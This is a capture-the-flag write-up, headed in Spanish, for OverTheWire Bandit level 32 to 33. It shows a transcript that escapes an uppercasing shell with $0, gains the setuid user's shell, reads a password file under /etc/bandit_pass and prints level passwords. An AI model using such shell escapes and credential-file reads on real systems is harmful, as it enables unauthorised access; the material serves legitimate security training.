# Level 32-33

## Objetivo
After all this `git` stuff its time for another escape. Good luck!
## Datos de Acceso
ssh bandit32@bandit.labs.overthewire.org -p 2220
rmCBvG56y58BXzv98yZGdO7ATVL5dW8y
## Solución
``` bash
C:\WINDOWS\system32>ssh bandit32@bandit.labs.overthewire.org -p 2220
                         _                     _ _ _
                        | |__   __ _ _ __   __| (_) |_
                        | '_ \ / _` | '_ \ / _` | | __|
                        | |_) | (_| | | | | (_| | | |_
                        |_.__/ \__,_|_| |_|\__,_|_|\__|


                      This is an OverTheWire game server.
            More information on http://www.overthewire.org/wargames

bandit32@bandit.labs.overthewire.org's password:
>> ls
sh: 1: LS: not found
>> $0
$ ls -la
total 36
drwxr-xr-x  2 root     root      4096 Feb 21 22:03 .
drwxr-xr-x 70 root     root      4096 Feb 21 22:04 ..
-rw-r--r--  1 root     root       220 Jan  6  2022 .bash_logout
-rw-r--r--  1 root     root      3771 Jan  6  2022 .bashrc
-rw-r--r--  1 root     root       807 Jan  6  2022 .profile
-rwsr-x---  1 bandit33 bandit32 15128 Feb 21 22:03 uppershell
$ whoami
bandit33
$ cat /etc/bandit\_pass/bandit33
odHo63fHiFqcWWJG9rLiLDtPm45KzUKy
```
## Notas Adicionales

## Referencias

